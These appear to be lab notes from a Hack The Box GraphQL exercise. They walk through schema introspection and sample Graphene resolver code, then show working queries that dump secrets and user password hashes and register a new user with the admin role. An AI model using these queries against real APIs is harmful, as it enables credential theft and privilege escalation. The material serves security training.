# Test-1

- According to GraphQL doc:
    
    “GraphQL is introspective. This means you can query a GraphQL schema for details about itself.” 
    
    “Query `__schema` to list all types defined in the schema and get details about each: “
    
    ```graphql
    query{
      __schema{
        types{
          name
          kind
          description
          fields{
            name
          }
        }
      }
    }
    ```
    
    - response:
        
        ```graphql
        {
          "data": {
            "__schema": {
              "types": [
                {
                  "name": "Query",
                  "kind": "OBJECT",
                  "description": null,
                  "fields": [
                    {
                      "name": "node"
                    },
                    {
                      "name": "secrets"
                    },
                    {
                      "name": "users"
                    },
                    {
                      "name": "posts"
                    },
                    {
                      "name": "user"
                    },
                    {
                      "name": "postByAuthor"
                    },
                    {
                      "name": "post"
                    }
                  ]
                },
                {
                  "name": "Node",
                  "kind": "INTERFACE",
                  "description": "An object with an ID",
                  "fields": [
                    {
                      "name": "id"
                    }
                  ]
                },
                {
                  "name": "ID",
                  "kind": "SCALAR",
                  "description": "The `ID` scalar type represents a unique identifier, often used to refetch an object or as key for a cache. The ID type appears in a JSON response as a String; however, it is not intended to be human-readable. When expected as an input type, any string (such as `\"4\"`) or integer (such as `4`) input value will be accepted as an ID.",
                  "fields": null
                },
                {
                  "name": "SecretObject",
                  "kind": "OBJECT",
                  "description": null,
                  "fields": [
                    {
                      "name": "id"
                    },
                    {
                      "name": "secret"
                    }
                  ]
                },
                {
                  "name": "String",
                  "kind": "SCALAR",
                  "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.",
                  "fields": null
                },
                {
                  "name": "UserObject",
                  "kind": "OBJECT",
                  "description": null,
                  "fields": [
                    {
                      "name": "uuid"
                    },
                    {
                      "name": "id"
                    },
                    {
                      "name": "username"
                    },
                    {
                      "name": "password"
                    },
                    {
                      "name": "role"
                    },
                    {
                      "name": "msg"
                    },
                    {
                      "name": "posts"
                    }
                  ]
                },
                {
                  "name": "PostObjectConnection",
                  "kind": "OBJECT",
                  "description": null,
                  "fields": [
                    {
                      "name": "pageInfo"
                    },
                    {
                      "name": "edges"
                    }
                  ]
                },
                {
                  "name": "PageInfo",
                  "kind": "OBJECT",
                  "description": "The Relay compliant `PageInfo` type, containing data necessary to paginate this connection.",
                  "fields": [
                    {
                      "name": "hasNextPage"
                    },
                    {
                      "name": "hasPreviousPage"
                    },
                    {
                      "name": "startCursor"
                    },
                    {
                      "name": "endCursor"
                    }
                  ]
                },
                {
                  "name": "Boolean",
                  "kind": "SCALAR",
                  "description": "The `Boolean` scalar type represents `true` or `false`.",
                  "fields": null
                },
                {
                  "name": "PostObjectEdge",
                  "kind": "OBJECT",
                  "description": "A Relay edge containing a `PostObject` and its cursor.",
                  "fields": [
                    {
                      "name": "node"
                    },
                    {
                      "name": "cursor"
                    }
                  ]
                },
                {
                  "name": "PostObject",
                  "kind": "OBJECT",
                  "description": null,
                  "fields": [
                    {
                      "name": "uuid"
                    },
                    {
                      "name": "id"
                    },
                    {
                      "name": "title"
                    },
                    {
                      "name": "body"
                    },
                    {
                      "name": "category"
                    },
                    {
                      "name": "authorId"
                    },
                    {
                      "name": "author"
                    }
                  ]
                },
                {
                  "name": "Int",
                  "kind": "SCALAR",
                  "description": "The `Int` scalar type represents non-fractional signed whole numeric values. Int can represent values between -(2^31 - 1) and 2^31 - 1 since represented in JSON as double-precision floating point numbers specifiedby IEEE 754.",
                  "fields": null
                },
                {
                  "name": "Mutation",
                  "kind": "OBJECT",
                  "description": null,
                  "fields": [
                    {
                      "name": "registerUser"
                    }
                  ]
                },
                {
                  "name": "RegisterUser",
                  "kind": "OBJECT",
                  "description": null,
                  "fields": [
                    {
                      "name": "user"
                    }
                  ]
                },
                {
                  "name": "RegisterUserInput",
                  "kind": "INPUT_OBJECT",
                  "description": null,
                  "fields": null
                },
                {
                  "name": "__Schema",
                  "kind": "OBJECT",
                  "description": "A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation and subscription operations.",
                  "fields": [
                    {
                      "name": "types"
                    },
                    {
                      "name": "queryType"
                    },
                    {
                      "name": "mutationType"
                    },
                    {
                      "name": "subscriptionType"
                    },
                    {
                      "name": "directives"
                    }
                  ]
                },
                {
                  "name": "__Type",
                  "kind": "OBJECT",
                  "description": "The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name and description, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.",
                  "fields": [
                    {
                      "name": "kind"
                    },
                    {
                      "name": "name"
                    },
                    {
                      "name": "description"
                    },
                    {
                      "name": "fields"
                    },
                    {
                      "name": "interfaces"
                    },
                    {
                      "name": "possibleTypes"
                    },
                    {
                      "name": "enumValues"
                    },
                    {
                      "name": "inputFields"
                    },
                    {
                      "name": "ofType"
                    }
                  ]
                },
                {
                  "name": "__TypeKind",
                  "kind": "ENUM",
                  "description": "An enum describing what kind of type a given `__Type` is",
                  "fields": null
                },
                {
                  "name": "__Field",
                  "kind": "OBJECT",
                  "description": "Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.",
                  "fields": [
                    {
                      "name": "name"
                    },
                    {
                      "name": "description"
                    },
                    {
                      "name": "args"
                    },
                    {
                      "name": "type"
                    },
                    {
                      "name": "isDeprecated"
                    },
                    {
                      "name": "deprecationReason"
                    }
                  ]
                },
                {
                  "name": "__InputValue",
                  "kind": "OBJECT",
                  "description": "Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value.",
                  "fields": [
                    {
                      "name": "name"
                    },
                    {
                      "name": "description"
                    },
                    {
                      "name": "type"
                    },
                    {
                      "name": "defaultValue"
                    }
                  ]
                },
                {
                  "name": "__EnumValue",
                  "kind": "OBJECT",
                  "description": "One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.",
                  "fields": [
                    {
                      "name": "name"
                    },
                    {
                      "name": "description"
                    },
                    {
                      "name": "isDeprecated"
                    },
                    {
                      "name": "deprecationReason"
                    }
                  ]
                },
                {
                  "name": "__Directive",
                  "kind": "OBJECT",
                  "description": "A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\n\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.",
                  "fields": [
                    {
                      "name": "name"
                    },
                    {
                      "name": "description"
                    },
                    {
                      "name": "locations"
                    },
                    {
                      "name": "args"
                    }
                  ]
                },
                {
                  "name": "__DirectiveLocation",
                  "kind": "ENUM",
                  "description": "A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.",
                  "fields": null
                }
              ]
            }
          }
        }
        ```
        

---

## 1. The Core Data Objects

These represent the "models" in the system. In the backend, they are defined as `type` objects.

### **UserObject**

The schema shows a user with typical profile fields, but notably includes a `password` field and a connection to their posts.

```graphql
type UserObject {
  uuid: String
  id: ID
  username: String
  password: String
  role: String
  msg: String
  posts: PostObjectConnection  # This links to the pagination logic below
}
```

### **PostObject**

This represents a blog post or social media entry.

```graphql
type PostObject {
  uuid: String
  id: ID
  title: String
  body: String
  category: String
  authorId: Int
  author: UserObject
}
```

---

## 2. The Query Entry Points

The `Query` type defines what you can actually ask for. In your JSON, the `Query` object lists several fields that act as "read" endpoints.

```graphql
type Query {
  node(id: ID!): Node           # Fetch anything by its ID
  secrets: [SecretObject]       # Likely returns a list of secrets
  users: [UserObject]           # Get all users
  user(id: ID!): UserObject     # Get a specific user
  posts: PostObjectConnection   # Get a paginated list of posts
}
```

---

## 3. Relay-Style Pagination (The "Edges" and "Nodes")

You’ll notice types like `PostObjectConnection` and `PostObjectEdge`. This follows the **Relay Specification**, which is a standard way to handle large lists of data (pagination).

- **Connection:** The wrapper for the list.
- **Edge:** A wrapper for the item that includes a `cursor` (a marker for where that item sits in the list).
- **PageInfo:** Metadata telling the frontend if there are more items to fetch.

```graphql
type PostObjectConnection {
  pageInfo: PageInfo!
  edges: [PostObjectEdge]
}

type PostObjectEdge {
  node: PostObject
  cursor: String!
}
```

---

## 4. Mutations (Changing Data)

While Queries are for reading, **Mutations** are for writing. the introspection shows a `registerUser` field.

```graphql
type Mutation {
  # Takes an input object and returns a RegisterUser object containing the new user
  registerUser(input: RegisterUserInput!): RegisterUser
}
```

---

The backend code for this API is likely built using a framework like **Graphene (Python)**. The server takes these type definitions and maps them to "**Resolvers**"—functions that go to a database to fetch the actual values for `username`, `title`, etc

In **Graphene**, resolvers are defined as methods within the `ObjectType` classes. A key convention in Graphene is that for a field named `username`, the resolver method must be named `resolve_username`. If the field is at the root of a query, it's defined in the `Query` class.

Here is how the Python code for your specific schema would likely be structured.

---

## 1. Object Types and Field Resolvers

Graphene uses a class-based approach. The `self` (or `parent`) argument in a resolver represents the data object fetched by the level above it.

```python
import graphene

class PostObject(graphene.ObjectType):
    id = graphene.ID()
    title = graphene.String()
    body = graphene.String()
    author_id = graphene.Int()
    # Relationship: Post -> User
    author = graphene.Field(lambda: UserObject)

    def resolve_author(parent, info):
        # 'parent' is the Post instance. We use its author_id to find the User.
        return UserModel.objects.get(id=parent.author_id)

class UserObject(graphene.ObjectType):
    uuid = graphene.String()
    username = graphene.String()
    role = graphene.String()
    # Relationship: User -> Posts (Connection for pagination)
    posts = graphene.Field(lambda: PostObjectConnection)

    def resolve_posts(parent, info):
        # 'parent' is the User instance. Fetch posts where author matches.
        return PostModel.objects.filter(author_id=parent.id)
```

---

## 2. The Root Query Resolver

This is the entry point where you define how to fetch the initial data.

```python
class Query(graphene.ObjectType):
    user = graphene.Field(UserObject, id=graphene.ID(required=True))
    posts = graphene.List(PostObject)
    secrets = graphene.List(lambda: SecretObject)

    def resolve_user(root, info, id):
        # Standard database lookup (e.g., Django ORM or SQLAlchemy)
        return UserModel.objects.get(pk=id)

    def resolve_posts(root, info):
        return PostModel.objects.all()

    def resolve_secrets(root, info):
        # Security check: info.context usually holds the request/user session
        if not info.context.user.is_authenticated:
            return None
        return SecretModel.objects.all()
```

---

## 3. Mutation Resolver (RegisterUser)

In Graphene, Mutations are separate classes that define an `Arguments` inner class and a `mutate` method.

```python
class RegisterUser(graphene.Mutation):
    class Arguments:
        username = graphene.String(required=True)
        password = graphene.String(required=True)

    # What the mutation returns
    user = graphene.Field(UserObject)

    def mutate(root, info, username, password):
        # Business logic: Create the user in the database
        new_user = UserModel(
            username=username,
            password=make_password(password) # Hash the password!
        )
        new_user.save()
        
        # Return an instance of the mutation
        return RegisterUser(user=new_user)
```

---

### How Graphene Processes Your Request

When you run your query, Graphene follows a "Resolve Chain."

1. **Query Level:** Graphene calls `Query.resolve_user()`. This hits your database and returns a Python object (e.g., a Django Model instance).
2. **Object Level:** Graphene looks at the `UserObject`. For simple fields like `username`, it just looks for an attribute on the object. For complex fields like `posts`, it calls `UserObject.resolve_posts()`.
3. **Context:** The `info` argument passed to every resolver contains the `context` (usually the HTTP request), which is where you handle authentication and global settings.

# Test-2

- Query `__type` to get details about any type:
    
    ```graphql
    query {
      __type(name: "UserObject") {
        name
        kind
        description
        fields {
          name
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__type": {
          "name": "UserObject",
          "kind": "OBJECT",
          "description": null,
          "fields": [
            {
              "name": "uuid"
            },
            {
              "name": "id"
            },
            {
              "name": "username"
            },
            {
              "name": "password"
            },
            {
              "name": "role"
            },
            {
              "name": "msg"
            },
            {
              "name": "posts"
            }
          ]
        }
      }
    }
    ```
    

- Query for specific user
    
    ```graphql
    query {
      user(username: "admin") {
        username
        role
        msg
        posts {
          edges {
            node {
              title
              body
            }
          }
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "user": {
          "username": "admin",
          "role": "admin",
          "msg": "Hello admin!",
          "posts": {
            "edges": [
              {
                "node": {
                  "title": "Lorem ipsum 1",
                  "body": "Lorem ipsum ....et."
                }
              },
              {
                "node": {
                  "title": "Lorem ipsum 2",
                  "body": "Lorem ips....et."
                }
              },
              {
                "node": {
                  "title": "Lorem ipsum 3",
                  "body": "Lorem i....amet."
                }
              },
              {
                "node": {
                  "title": "Lorem ipsum 4",
                  "body": "Lore....t."
                }
              }
            ]
          }
        }
      }
    }
    ```
    

- Nested Query
    
    ```graphql
    query ExploreSensitiveData {
      secrets {
        id
        secret
      }
      users {
        username
        password  
        role
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "secrets": [
          {
            "id": "U2VjcmV0T2JqZWN0OjE=",
            "secret": "HTB{...d}"
          }
        ],
        "users": [
          {
            "username": "htb-stdnt",
            "password": "c874441baa22306df202ca127f23d3a7",
            "role": "user"
          },
          {
            "username": "test",
            "password": "b4574701cdf945940353b356925dddb7",
            "role": "user"
          },
          {
            "username": "admin",
            "password": "HTB{7...}",
            "role": "admin"
          }
        ]
      }
    }
    ```
    

- Identify all mutations supported by the backend and their arguments.
    
    ```graphql
    query {
      __schema {
        mutationType {
          name
          fields {
            name
            args {
              name
              defaultValue
              type {
                ...TypeRef
              }
            }
          }
        }
      }
    }
    
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__schema": {
          "mutationType": {
            "name": "Mutation",
            "fields": [
              {
                "name": "registerUser",
                "args": [
                  {
                    "name": "input",
                    "defaultValue": null,
                    "type": {
                      "kind": "NON_NULL",
                      "name": null,
                      "ofType": {
                        "kind": "INPUT_OBJECT",
                        "name": "RegisterUserInput",
                        "ofType": null
                      }
                    }
                  }
                ]
              }
            ]
          }
        }
      }
    }
    ```
    
    From the result, we can identify a mutation `registerUser`, presumably allowing us to create new users. The mutation requires a `RegisterUserInput` object as an input:
    
    ```graphql
    query{
      __type(name:"RegisterUserInput"){
        name
        inputFields{
          description
          defaultValue
          name
          
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__type": {
          "name": "RegisterUserInput",
          "inputFields": [
            {
              "description": null,
              "defaultValue": null,
              "name": "username"
            },
            {
              "description": null,
              "defaultValue": null,
              "name": "password"
            },
            {
              "description": null,
              "defaultValue": null,
              "name": "role"
            },
            {
              "description": null,
              "defaultValue": null,
              "name": "msg"
            }
          ]
        }
      }
    }
    ```
    

- Modify server data using the mutation
    
    
    From the previous query we identified a mutiation called registerUser that require an object as input named RegisterUser and this object contains four fields to be passed: username, password(as MD5Hash), role and msg
    
    ```graphql
    mutation{
      registerUser(input: {username: "Aisha", password: "098f6bcd4621d373cade4e832627b4f6", role: "admin", msg: "testing"}){
        user{
          username
          password
          role
          msg
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "registerUser": {
          "user": {
            "username": "Aisha",
            "password": "098f6bcd4621d373cade4e832627b4f6",
            "role": "admin",
            "msg": "testing"
          }
        }
      }
    }
    ```
    
    note if we didnt defined the `user {..}`
    
    ```graphql
    mutation{
      registerUser(input: {username: "Aisha", password: "098f6bcd4621d373cade4e832627b4f6", role: "admin", msg: "testing"})
    }
    ```
    
    the server will throw this error:
    
    ```graphql
    {
      "errors": [
        {
          "message": "Field \"registerUser\" of type \"RegisterUser\" must have a sub selection.",
          "locations": [
            {
              "line": 2,
              "column": 3
            }
          ]
        }
      ]
    }
    ```
    
    This error will help us in case we dont know what fields to specify after the mutation input.
    
    ### The "Sub-Selection" Rule
    
    The error **"must have a sub selection"** means: *"I finished the registration, and I have a `RegisterUser` object ready for you, but you didn't tell me which fields inside it you want to see."*
    
    Because `RegisterUser` is an **Object** (a complex type) and not a **Scalar** (a simple value like a String or Int), GraphQL refuses to return anything until you pick the specific sub-fields. To know what you can put inside the `{ }` brackets, you have to query that specific type
    
    ```graphql
    query {
      __type(name: "RegisterUser") {
        name
        fields {
          name
          type {
            name
            kind
          }
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__type": {
          "name": "RegisterUser",
          "fields": [
            {
              "name": "user",
              "type": {
                "name": "UserObject",
                "kind": "OBJECT"
              }
            }
          ]
        }
      }
    }
    ```
    
    Then, because `user` is a `UserObject`, you look at the `UserObject` definition
    
    ```graphql
    query {
      __type(name: "UserObject") {
        name
        fields {
          name
          type {
            name
            kind
          }
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__type": {
          "name": "UserObject",
          "fields": [
            {
              "name": "uuid",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "id",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "username",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            },
            {
              "name": "password",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            },
            {
              "name": "role",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            },
            {
              "name": "msg",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            },
            {
              "name": "posts",
              "type": {
                "name": "PostObjectConnection",
                "kind": "OBJECT"
              }
            }
          ]
        }
      }
    }
    ```
    
    Done! This is how we figured out the sub-fields of the `registerUser` mutation